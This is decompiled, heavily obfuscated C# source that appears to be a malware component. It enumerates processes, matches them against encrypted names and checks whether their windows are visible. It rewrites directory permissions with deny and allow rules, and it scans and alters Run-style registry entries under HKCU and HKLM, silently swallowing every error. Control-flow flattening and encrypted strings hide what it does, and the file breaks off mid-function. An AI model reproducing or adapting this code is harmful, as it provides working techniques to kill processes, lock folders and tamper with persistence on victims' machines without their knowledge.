using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

public class mRGXJIyJfLzOpZoUucBPJErJOvpQA
{
	public static int SAjxBDBlhHvJgKDXdLUOciIFPCOx;

	public static int TOmxQTadNeyqFfQSzdgZQtIsDQHZ;

	public static int FSymfBAMHwKXjxTacKfsYdKfLTZG;

	[CompilerGenerated]
	private static ThreadStart cBxsZoXwalliJpiiINGhzRYFsLVo;

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(uint uint_0, bool bool_0, int int_0);

	[DllImport("psapi.dll")]
	private static extern uint GetModuleFileNameEx(IntPtr intptr_0, IntPtr intptr_1, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(IntPtr intptr_0, string string_0);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	public static void BDEAvOuSjFTgWzLpaSozkmFsNisc()
	{
		if (cBxsZoXwalliJpiiINGhzRYFsLVo == null)
		{
			goto IL_0029;
		}
		goto IL_0082;
		IL_0082:
		Thread thread_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.WsclJKVvaIhCWJeVoNxiLlIHtYJR(cBxsZoXwalliJpiiINGhzRYFsLVo);
		int num = -661199668;
		goto IL_004d;
		IL_004d:
		while (true)
		{
			int num2 = num;
			uint num3;
			switch ((num3 = (uint)(-(~((num2 * -1517325281) ^ 0x68623F8D) * 1645510933))) % 5u)
			{
			case 3u:
				cBxsZoXwalliJpiiINGhzRYFsLVo = delegate
				{
					while (true)
					{
						if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.priBrMpjniNsIUkQaxVveGTxhNu(GpuDNKzAIXCxgEhIGOCFaCjGqitTB.QUGKShsngkmFbeawTxGpAlGJtgkg, _003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<string>(883403100u)))
						{
							goto IL_002c;
						}
						goto IL_0060;
						IL_0060:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.rrYZfaJJCVIMPMbDAeJSeIlBhKFfb(_003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(2811553908u));
						int num4 = 1322325947;
						goto IL_0031;
						IL_0031:
						while (true)
						{
							int num5 = num4;
							uint num6;
							switch ((num6 = (uint)(num5 * -1561431315 * -230933855 - 27328174)) % 4u)
							{
							case 3u:
								PFcXsEKWombhNSyYwIBjkqKLZnad.WBnBogxnBFPPzeJAAsMSqiJBABMhA();
								num4 = (int)(num6 * 46421160) ^ -501035990;
								continue;
							case 2u:
								goto IL_002c;
							case 0u:
								goto IL_0060;
							}
							break;
						}
						continue;
						IL_002c:
						num4 = -950484355;
						goto IL_0031;
					}
				};
				num = ((int)num3 * -2076279050) ^ -1310865865;
				continue;
			case 2u:
				break;
			case 1u:
				mRGXJIyJfLzOpZoUucBPJErJOvpQA.geEQAiwUiMenUuFPfmMpeRKqBEpI(thread_, (byte)_003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<int>(1385879964u) != 0);
				num = ((int)num3 * -694028790) ^ 0x3C69B167;
				continue;
			case 0u:
				goto IL_0082;
			default:
				mRGXJIyJfLzOpZoUucBPJErJOvpQA.GmmBanGxoEmzrHQWYwBpNvfYGHKs(thread_);
				return;
			}
			break;
		}
		goto IL_0029;
		IL_0029:
		num = -254123749;
		goto IL_004d;
	}

	public static void gmEojEFqBhIpSSzwdCgwOvIFHWaA()
	{
		mnwkxeTVuFCbtexkTAXrzLSsMTSk();
	}

	public static void mnwkxeTVuFCbtexkTAXrzLSsMTSk()
	{
		Process[] array = mRGXJIyJfLzOpZoUucBPJErJOvpQA.qgtzORtPHcHLheUBslcqSmSwUrbeA();
		int num4 = default(int);
		while (true)
		{
			int num = -1996820330;
			while (true)
			{
				int num2 = num;
				int num5;
				uint num3;
				switch ((num3 = (uint)(((num2 ^ -425331774) + 1734079412 - 1469997570 + -283260217) * 754115569)) % 4u)
				{
				case 1u:
					goto IL_0008;
				case 0u:
					break;
				case 3u:
					if (num4 >= array.Length)
					{
						num5 = 1377074942;
						goto IL_02b4;
					}
					goto default;
				default:
					{
						Process process_ = array[num4];
						try
						{
							if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<string>(867903803u))))
							{
								goto IL_010a;
							}
							goto IL_0281;
							IL_0281:
							int num6;
							int num7;
							if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.ATcRXbEwqymIbvFFGBmGKeSZwBCE(mRGXJIyJfLzOpZoUucBPJErJOvpQA.EhJaisjaZVTRSdXMEAouPhzHnPjW(process_), mRGXJIyJfLzOpZoUucBPJErJOvpQA.EhJaisjaZVTRSdXMEAouPhzHnPjW(mRGXJIyJfLzOpZoUucBPJErJOvpQA.uJPaeIynHmgSLDmlNNnzRyRyhXCF())))
							{
								num6 = 565923830;
								num7 = 565923830;
							}
							else
							{
								num6 = 1880158137;
								num7 = 1880158137;
							}
							goto IL_0220;
							IL_0220:
							while (true)
							{
								num2 = num6;
								switch ((num3 = (uint)(((num2 ^ -425331774) + 1734079412 - 1469997570 + -283260217) * 754115569)) % 9u)
								{
								case 8u:
								{
									int num16;
									int num17;
									if (!IsWindowVisible(mRGXJIyJfLzOpZoUucBPJErJOvpQA.suQqkjJLgOygcAenoCmrDBYMahMA(process_)))
									{
										num16 = 140781729;
										num17 = 140781729;
									}
									else
									{
										num16 = -1189958157;
										num17 = -1189958157;
									}
									num6 = num16 ^ (int)(num3 * 566966226);
									continue;
								}
								case 7u:
									hBKlXnbRSfBMmInLdToGiAoSJVQJ(mRGXJIyJfLzOpZoUucBPJErJOvpQA.EhJaisjaZVTRSdXMEAouPhzHnPjW(process_), mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.SQEnKHJDRzGXxtseKDNuDZOwePms(process_));
									num6 = ((int)num3 * -126943432) ^ -1096503863;
									continue;
								case 6u:
									break;
								case 5u:
								{
									int num12;
									int num13;
									if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<string>(3374814570u))))
									{
										num12 = -894323291;
										num13 = -894323291;
									}
									else
									{
										num12 = -612325476;
										num13 = -612325476;
									}
									num6 = num12 ^ ((int)num3 * -1090993094);
									continue;
								}
								case 3u:
								{
									int num10;
									int num11;
									if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<string>(1721614879u))))
									{
										num10 = 517465516;
										num11 = 517465516;
									}
									else
									{
										num10 = 547596323;
										num11 = 547596323;
									}
									num6 = num10 ^ ((int)num3 * -2084371364);
									continue;
								}
								case 2u:
								{
									int num14;
									int num15;
									if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.PvcAaZajYYHneOfkDNGtufzynpbTA<string>(426002763u))))
									{
										num14 = 605828057;
										num15 = 605828057;
									}
									else
									{
										num14 = 527585055;
										num15 = 527585055;
									}
									num6 = num14 ^ ((int)num3 * -1877502591);
									continue;
								}
								case 1u:
								{
									int num8;
									int num9;
									if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.TgHkaWKdAziFtFcMsJJzibLyyuwc(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nRolUkbsWQiHHCUcjCjqIXCGGDct(process_)), mRGXJIyJfLzOpZoUucBPJErJOvpQA.PpHAYrXzBZWrhYRcCcrQahhNYuIB(_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<string>(4272224377u))))
									{
										num8 = 132581932;
										num9 = 132581932;
									}
									else
									{
										num8 = 1244180126;
										num9 = 1244180126;
									}
									num6 = num8 ^ (int)(num3 * 1932896919);
									continue;
								}
								default:
									goto end_IL_0075;
								case 0u:
									goto IL_0281;
								case 4u:
									goto end_IL_0075;
								}
								break;
							}
							goto IL_010a;
							IL_010a:
							num6 = -1267178951;
							goto IL_0220;
							end_IL_0075:;
						}
						catch
						{
						}
						num4 += _003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<int>(837278686u);
						goto IL_02af;
					}
					IL_02af:
					num5 = 700438941;
					goto IL_02b4;
					IL_02b4:
					num2 = num5;
					switch ((num3 = (uint)(((num2 ^ -425331774) + 1734079412 - 1469997570 + -283260217) * 754115569)) % 3u)
					{
					case 2u:
						break;
					case 0u:
						goto IL_02af;
					default:
						return;
					case 1u:
						return;
					}
					goto case 3u;
				}
				break;
				IL_0008:
				num4 = _003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<int>(3147248539u);
				num = (int)((num3 * 793463038) ^ 0x217F4BAA);
			}
		}
	}

	public static void hBKlXnbRSfBMmInLdToGiAoSJVQJ(string string_0, string string_1, int int_0)
	{
		MXfFjngUTwpCTzYwAZualEwTWqms(int_0);
		while (true)
		{
			int num = -127605653;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(num2 - -931955997 - -181809197 - 1357246131 - 1618316094))) % 4u)
				{
				case 3u:
					ytSfQjALHixrrtpisHQMqamXUAeB(string_0, string_1, int_0);
					num = (int)((num3 * 1185789188) ^ 0x325E10E4);
					continue;
				case 2u:
					ZpkFAidPcpqvqAhpGcncFwjvRRSBA(string_0, string_1);
					num = (int)(num3 * 1180012972) ^ -1872533523;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	public static void AXtwWtZknlRMIHXRIIoDsOokxrUC(string string_0)
	{
		try
		{
			string string_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB((object)mRGXJIyJfLzOpZoUucBPJErJOvpQA.rwzsYBQyOGpiJAgtNRvMWaLHlaHm());
			DirectoryInfo directoryInfo_ = default(DirectoryInfo);
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			while (true)
			{
				int num = -1037220456;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(((num2 * 788281191) ^ 0x23BED534) * 669832773 * -2112533081)) % 5u)
					{
					case 2u:
						directoryInfo_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.DoclIrGmjAYUDWHzLSIJHdRCirIF(string_0);
						directorySecurity = mRGXJIyJfLzOpZoUucBPJErJOvpQA.LzxiElwXNyFSXHQpVKHEZfwaCYyv();
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<int>(2306549763u), (InheritanceFlags)_003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1566745286u), (PropagationFlags)_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<int>(153619232u), (AccessControlType)_003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(997787776u)));
						num = (int)((num3 * 595197523) ^ 0x120F4DDD);
						continue;
					case 1u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.JkWZYSzbEdFlkWdDAqYJfPYQvwNA((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<int>(1683131574u) != 0, (byte)_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<int>(3309172441u) != 0);
						num = ((int)num3 * -2085245862) ^ -582957688;
						continue;
					case 0u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.duQvqaQxxNHMQoJHsXTSyQhBJiYG(directoryInfo_, directorySecurity);
						num = ((int)num3 * -1471950151) ^ 0x4616A61;
						continue;
					default:
						return;
					case 3u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void eRjFvtiLcQKxnavoekdGMWXOIQnPA(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo_ = default(DirectoryInfo);
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			string string_ = default(string);
			while (true)
			{
				int num = 881941262;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(num2 * 1299013083 * -316230791)) % 11u)
					{
					case 10u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.duQvqaQxxNHMQoJHsXTSyQhBJiYG(directoryInfo_, directorySecurity);
						num = ((int)num3 * -1556487187) ^ 0x362A2913;
						continue;
					case 9u:
						directorySecurity = mRGXJIyJfLzOpZoUucBPJErJOvpQA.LzxiElwXNyFSXHQpVKHEZfwaCYyv();
						num = (int)((num3 * 1628075621) ^ 0x39EC79ED);
						continue;
					case 8u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<int>(681672116u), (InheritanceFlags)_003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<int>(4066205961u), (PropagationFlags)_003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(823854280u), (AccessControlType)_003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(137503599u)));
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<int>(1677746748u), (InheritanceFlags)_003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(2793390760u), (PropagationFlags)_003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1422414588u), (AccessControlType)_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(1765197669u)));
						num = (int)((num3 * 744463060) ^ 0x595FA9BE);
						continue;
					case 7u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<int>(2604589807u), (InheritanceFlags)_003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<int>(2458417169u), (PropagationFlags)_003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(997787776u), (AccessControlType)_003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(703764269u)));
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<int>(1085133758u), (InheritanceFlags)_003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(2887533069u), (PropagationFlags)_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<int>(3309172441u), (AccessControlType)_003CModule_003E.blHaVlzmYUQQBLkBKXidagrTAbG<int>(952616933u)));
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(2889940376u), (InheritanceFlags)_003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(2887533069u), (PropagationFlags)_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(1950850204u), (AccessControlType)_003CModule_003E.PvcAaZajYYHneOfkDNGtufzynpbTA<int>(2005747591u)));
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<int>(1350249239u), (InheritanceFlags)_003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<int>(3280441213u), (PropagationFlags)_003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<int>(573925143u), (AccessControlType)_003CModule_003E.bRSGmsGWNJcmJIpCFajFxuwXmAZh<int>(901517181u)));
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.JkWZYSzbEdFlkWdDAqYJfPYQvwNA((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<int>(837278686u) != 0, (byte)_003CModule_003E.RjBjcaRpVQRQjduKhEhCRNnWcGZA<int>(703764269u) != 0);
						num = (int)(num3 * 1504760735) ^ -1279781045;
						continue;
					case 6u:
						string_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB((object)mRGXJIyJfLzOpZoUucBPJErJOvpQA.rwzsYBQyOGpiJAgtNRvMWaLHlaHm());
						num = ((int)num3 * -1152983278) ^ -1937919755;
						continue;
					case 4u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<int>(1102541764u), (InheritanceFlags)_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(2763664186u), (PropagationFlags)_003CModule_003E.MDOVZwJkbqafjMRifLnnfnKSxfOy<int>(2296003411u), (AccessControlType)_003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<int>(573925143u)));
						num = ((int)num3 * -450919421) ^ 0x45E87079;
						continue;
					case 3u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<int>(2584470986u), (InheritanceFlags)_003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<int>(129591264u), (PropagationFlags)_003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<int>(3071278406u), (AccessControlType)_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<int>(153619232u)));
						num = ((int)num3 * -693500774) ^ -261216864;
						continue;
					case 1u:
						mRGXJIyJfLzOpZoUucBPJErJOvpQA.RkFncqgeNlTcAsuorDKdfBVYOUZM((FileSystemSecurity)directorySecurity, mRGXJIyJfLzOpZoUucBPJErJOvpQA.xnlwXwpCunGfPgEkRZCfwBjioAoX(string_, (FileSystemRights)_003CModule_003E.RglfOnXgouCNqcZfJkUzZiRYPeNm<int>(230288574u), (InheritanceFlags)_003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<int>(3280441213u), (PropagationFlags)_003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(824077231u), (AccessControlType)_003CModule_003E.sFziFOmofPAHMrejeaheMvcjwDhT<int>(1765197669u)));
						num = ((int)num3 * -37160384) ^ -784558151;
						continue;
					case 0u:
						directoryInfo_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.DoclIrGmjAYUDWHzLSIJHdRCirIF(string_0);
						num = (int)((num3 * 524465296) ^ 0x58D00695);
						continue;
					default:
						return;
					case 5u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void ZpkFAidPcpqvqAhpGcncFwjvRRSBA(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey_ = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bhcvVIuKKmcdHKhaBrHAHapvxsPYA(Registry.CurrentUser, _003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<string>(3613707418u));
			string text = default(string);
			int num4 = default(int);
			string[] array = default(string[]);
			while (true)
			{
				IL_018a:
				int num = 1046469132;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(~(num2 + 1054728733) ^ 0x69B2FF20 ^ 0x25F2711A))) % 10u)
					{
					case 9u:
					{
						int num8;
						int num9;
						if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nsIintFHzsBqLffNjneczeJnvjnZ(registryKey_, text)), string_0))
						{
							num8 = -1094191096;
							num9 = -1094191096;
						}
						else
						{
							num8 = 1293640380;
							num9 = 1293640380;
						}
						num = num8 ^ ((int)num3 * -1690847244);
						continue;
					}
					case 8u:
					{
						int num6;
						int num7;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.ATcRXbEwqymIbvFFGBmGKeSZwBCE(text, PFcXsEKWombhNSyYwIBjkqKLZnad.JuLmHBSMNchgPkOYDzuCqunaTDHsA))
						{
							num6 = -1349156413;
							num7 = -1349156413;
						}
						else
						{
							num6 = 1993178708;
							num7 = 1993178708;
						}
						num = num6 ^ (int)(num3 * 1954538592);
						continue;
					}
					case 7u:
					{
						int num5;
						if (num4 < array.Length)
						{
							num = -92709585;
							num5 = -92709585;
						}
						else
						{
							num = 579295886;
							num5 = 579295886;
						}
						continue;
					}
					case 5u:
						KxIfVVBNIYycKaiyjxPulyArCsuBA(_003CModule_003E.hJQECUaiOdzqVTCrmwbGWmxnKMpg<string>(3773685099u), _003CModule_003E.sijOsyDrdtOknZIEEMNATWpRYcmI<string>(603442872u), text);
						num = ((int)num3 * -133886297) ^ -1718580198;
						continue;
					case 4u:
						array = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bVNeqCCOEpNeroszRSzzYKIXVBuS(registryKey_);
						num4 = _003CModule_003E.LgFoxgBqIeDqHwMbUrJzdDbPduER<int>(824077231u);
						num = ((int)num3 * -76337915) ^ -775555599;
						continue;
					case 3u:
						SAjxBDBlhHvJgKDXdLUOciIFPCOx += _003CModule_003E.PvcAaZajYYHneOfkDNGtufzynpbTA<int>(2005747591u);
						num = ((int)num3 * -51111325) ^ 0x8DE4769;
						continue;
					case 2u:
						num4 += _003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<int>(3636103151u);
						num = -973173867;
						continue;
					case 1u:
						text = array[num4];
						num = 730718395;
						continue;
					default:
						goto end_IL_013d;
					case 0u:
						break;
					case 6u:
						goto end_IL_013d;
					}
					goto IL_018a;
					continue;
					end_IL_013d:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_2 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bhcvVIuKKmcdHKhaBrHAHapvxsPYA(Registry.CurrentUser, _003CModule_003E.saHISdJPwKBDljvkBcQkvhegVHdh<string>(3175190705u));
			string text2 = default(string);
			int num11 = default(int);
			string[] array2 = default(string[]);
			while (true)
			{
				IL_033a:
				int num10 = 112393837;
				while (true)
				{
					int num2 = num10;
					uint num3;
					switch ((num3 = (uint)(-(~(num2 + 1054728733) ^ 0x69B2FF20 ^ 0x25F2711A))) % 11u)
					{
					case 10u:
					{
						int num15;
						int num16;
						if (!mRGXJIyJfLzOpZoUucBPJErJOvpQA.ATcRXbEwqymIbvFFGBmGKeSZwBCE(text2, PFcXsEKWombhNSyYwIBjkqKLZnad.JuLmHBSMNchgPkOYDzuCqunaTDHsA))
						{
							num15 = 592960738;
							num16 = 592960738;
						}
						else
						{
							num15 = 947147066;
							num16 = 947147066;
						}
						num10 = num15 ^ (int)(num3 * 130497939);
						continue;
					}
					case 9u:
						KxIfVVBNIYycKaiyjxPulyArCsuBA(_003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<string>(1487730332u), _003CModule_003E.IqDeOffJAyhLfPMKjPibRdyWexel<string>(2556572602u), text2);
						num10 = (int)((num3 * 735290301) ^ 0xE254502);
						continue;
					case 8u:
						num10 = ((int)num3 * -1141884031) ^ 0x1D1D1DE;
						continue;
					case 5u:
						num11 += _003CModule_003E.oQGcPizWpTmKJWhqplvYaKxHcQrO<int>(3636103151u);
						num10 = 505782834;
						continue;
					case 4u:
						array2 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bVNeqCCOEpNeroszRSzzYKIXVBuS(registryKey_2);
						num11 = _003CModule_003E.ZsXsNDGRbbBjKpBZHQikiDznkQrc<int>(3818606444u);
						num10 = (int)(num3 * 2072659992) ^ -1140417236;
						continue;
					case 3u:
						SAjxBDBlhHvJgKDXdLUOciIFPCOx += _003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<int>(137503599u);
						num10 = (int)(num3 * 960702151) ^ -391373958;
						continue;
					case 2u:
					{
						int num13;
						int num14;
						if (mRGXJIyJfLzOpZoUucBPJErJOvpQA.SHwQtoulbMdHDrgOikXJMDxoYbMt(mRGXJIyJfLzOpZoUucBPJErJOvpQA.GDqNNeEKixrLRgmISVJqLmVHXVmB(mRGXJIyJfLzOpZoUucBPJErJOvpQA.nsIintFHzsBqLffNjneczeJnvjnZ(registryKey_2, text2)), string_1))
						{
							num13 = 671648789;
							num14 = 671648789;
						}
						else
						{
							num13 = -561273177;
							num14 = -561273177;
						}
						num10 = num13 ^ ((int)num3 * -2142588621);
						continue;
					}
					case 1u:
						text2 = array2[num11];
						num10 = 535444025;
						continue;
					case 0u:
					{
						int num12;
						if (num11 < array2.Length)
						{
							num10 = -230730653;
							num12 = -230730653;
						}
						else
						{
							num10 = -691255953;
							num12 = -691255953;
						}
						continue;
					}
					default:
						goto end_IL_02e9;
					case 6u:
						break;
					case 7u:
						goto end_IL_02e9;
					}
					goto IL_033a;
					continue;
					end_IL_02e9:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_3 = mRGXJIyJfLzOpZoUucBPJErJOvpQA.bhcvVIuKKmcdHKhaBrHAHapvxsPYA(Registry.LocalMachine, _003CModule_003E.vCgetZRAfwOfXDFjqBKEQPxCexnFA<string>(2853264569u));
			int num18 = default(int);
			string[] array3 = default(string[]);
			string text3 = default(string);
			while (true)
			{
				IL_04f1:
				int num17 = 864520154;
				while (true)
				{
					int num2 = num17;
					uint num3;
					switch ((num3 = (uint)(-(~(num2 + 1054728733) ^ 0x69B2FF20 ^ 0x25F2711A))) % 11u)
					{
					case 10u:
					{
						int num21;
						if (num18 < array3.Length)
						{
							num17 = 897145371;
							num21 = 897145371;
						}
						else
						{
							num17 = 573254631;
							num21 = 573254631;
						}
						continue;
					}
					case 8u:
